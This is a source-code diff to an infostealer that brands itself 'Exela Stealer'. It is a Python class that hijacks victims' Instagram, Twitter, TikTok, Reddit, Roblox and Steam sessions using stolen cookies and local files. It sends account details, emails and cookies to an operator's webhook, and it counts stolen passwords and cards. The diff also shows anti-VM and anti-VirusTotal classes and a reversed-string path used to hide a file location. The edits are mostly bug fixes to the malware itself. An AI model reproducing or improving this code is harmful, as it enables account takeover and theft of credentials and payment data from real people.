@@ -294,7 +294,6 @@ class QuicaxdExela:
     def setInstaSession(self, cookie, value):
         try:
             pp = "https://i.hizliresim.com/8po0puy.jfif"
-            self.insta = True
             bio = ""
             fullname = ""
             sessionid = "sessionid=" + cookie
@@ -326,12 +325,12 @@ class QuicaxdExela:
             embed.add_field(name="Biography", inline=False, value=f"```{bio}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)  
+            self.insta = True
             self.instaa.append(f"Instagram Cookie : {sessionid}\nProfile URL : {profileURL}\nUser Name : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nBiography : {bio}\n==========================================================================")
         except:
             pass
     def setTwitterSession(self, cookie, value):
         try:
-            self.twitter = True
             description = ''
             authToken = f'{cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42' # this is ct0=ac1aa9d58c8798f0932410a1a564eb42 csrf token
             header = {'authority': 'twitter.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
@@ -368,12 +367,12 @@ class QuicaxdExela:
             embed.add_field(name="Is Verified", inline=True, value=f"```{req['verified']}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
+            self.twitter = True
             self.twitterr.append(f"Twitter Cookie : {cookie}\nProfile URL : {profileURL}\nUser Name : {username}\nScreen Name : {nickname}\nBiography : {description}\nFollower Count : {req['followers_count']}\nFollowing Count : {req['friends_count']}\nTotal Tweets : {req['statuses_count']}\nCreated At : {req['created_at']}\nIs Verified : {req['verified']}\n==========================================================================")                                        
         except:
             pass
     def setTiktokSession(self, cookie, value):
         try:
-            self.tiktok = True
             email = ''
             phone = ''
             cookies = "sessionid=" + cookie
@@ -404,12 +403,12 @@ class QuicaxdExela:
             embed.add_field(name="Coins", inline=True, value=f"```{coins}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
+            self.tiktok = True
             self.tiktokk.append(f"Tiktok Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{useranme}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n==========================================================================")
         except:
             pass
     def setRedditSession(self, cookie, value):
         try:
-            self.reddit = True
             gmail = ""
             cookies = "reddit_session=" + cookie
             headers = { "cookie": cookies, "Authorization": "Basic b2hYcG9xclpZdWIxa2c6" }
@@ -449,12 +448,12 @@ class QuicaxdExela:
             embed.add_field(name="Suspended", inline=True, value=f"```{suspended}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
+            self.reddit = True
             self.redditt.append(f"Reddit Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma: {commentKarma}\nTotal Karma : {totalKarma}\nCoins : {coins}\nIs Mod : {mod}\nIs Gold : {gold}\nSuspended : {suspended}\n==========================================================================")
         except:
             pass
     def setSteam(self):
         try:
-            self.steam = True
             steamLocalUserDataPath = self.reverseToNormal('fdv.sresunigol\gifnoc\maetS\)68x( seliF margorP\:C')
             if os.path.isfile(steamLocalUserDataPath):
                 filee = open(steamLocalUserDataPath, "r", encoding="utf-8", errors="ignore")
@@ -462,8 +461,7 @@ class QuicaxdExela:
                 steamid = re.findall(r"7656[0-9]{13}", data)
                 for remember in data:
                     if 'RememberPassword' in remember:
-                        #self.foundSteamSession = True
-                        pass
+                        self.steam = True
                 if steamid:
                     embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Steam Session Detected***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
                     result = "".join(steamid)
@@ -484,12 +482,12 @@ class QuicaxdExela:
                     embed.add_field(name="Player Level", inline=True, value=f"```{data2}```")
                     embed.set_footer(text="https://t.me/ExelaStealer")
                     self.hook.send(embed=embed)
+                    self.steam = True
                     self.steamm.append(f"Steam Identifier : {idf}\nProfile URL : {profileURL}\nProfil Name : {displayName}\nTime Created : {timecreated}\nPlayer Level : {data2}\n==========================================================================")
-        except:
-            pass
+        except Exception as e:
+            print(str(e))
     def setRoblox(self, cookie, value):
         try:
-            self.roblox = True
             email = ""
             robuxCookie = '.ROBLOSECURITY=' + cookie
             headers = {'cookie':robuxCookie,"Accept-Encoding": "identity"}
@@ -513,6 +511,7 @@ class QuicaxdExela:
             embed.add_field(name="Email Verified", inline=False, value=f"```{accinfo['IsEmailVerified']}```")
             embed.set_footer(text="https://t.me/ExelaStealer")
             self.hook.send(embed=embed)
+            self.roblox = True
             self.robloxx.append(f"Steam Cookie : {robuxCookie}\nProfile URL : {picUrl}\nTotal Robux : {robux}\nName : {accinfo['Name']}\nEmail : {email}\nEmail Verified : {accinfo['Name']}\n==========================================================================")
         except:
             pass
@@ -635,7 +634,7 @@ class QuicaxdExela:
         twitter = ""
         tiktok = ""
         reddit = ""
-        steam = ""
+        steamm = ""
         discords = ""
         roblox = ""
         if self.insta: instagram = "Yes"
@@ -648,8 +647,8 @@ class QuicaxdExela:
         else:reddit="Nope"
         if self.discrod: discords = "Yes"
         else:discords = "Nope"
-        if self.steam: steam="Yes"
-        else: steam="Nope"
+        if self.steam: steamm="Yes"
+        else: steamm="Nope"
         if self.roblox: roblox = "Yes"
         else:roblox = "Nope"
         command = "wmic csproduct get uuid"
@@ -664,7 +663,7 @@ class QuicaxdExela:
         embed.add_field(name="Found Tiktok Session's",  inline=True,value=f"```{tiktok}```")
         embed.add_field(name="Found Reddit Session's",  inline=True,value=f"```{reddit}```")
         embed.add_field(name="Found Discord Token's",  inline=True,value=f"```{discords}```")
-        embed.add_field(name="Found Steam Session's",  inline=True,value=f"```{steam}```")
+        embed.add_field(name="Found Steam Session's",  inline=True,value=f"```{steamm}```")
         embed.add_field(name="Found Roblox Session's",  inline=True,value=f"```{roblox}```")
         embed.add_field(name="Total Password's",  inline=True,value=f"```{self.passws}```")
         embed.add_field(name="Total Card's",  inline=True,value=f"```{self.cc}```")
@@ -862,7 +861,7 @@ class QuicaxdExela:
                     q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
                     for re in self.discordd:
                         q.write(str(re) + "\n")
-            if not self.steamm == 0:
+            if not self.steam:
                 os.mkdir(tmp + f"\\{run}\\Steam")
                 with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
                     q.write("----------------------https://t.me/ExelaStealer/----------------------\n"+ "=" * 70 + "\n")
@@ -1175,7 +1174,6 @@ class HardAntiVM:
                     return False   
         except:
             return False
-
 class Antivirustotal:
     def __init__(self) -> None:
         command = "wmic csproduct get uuid"
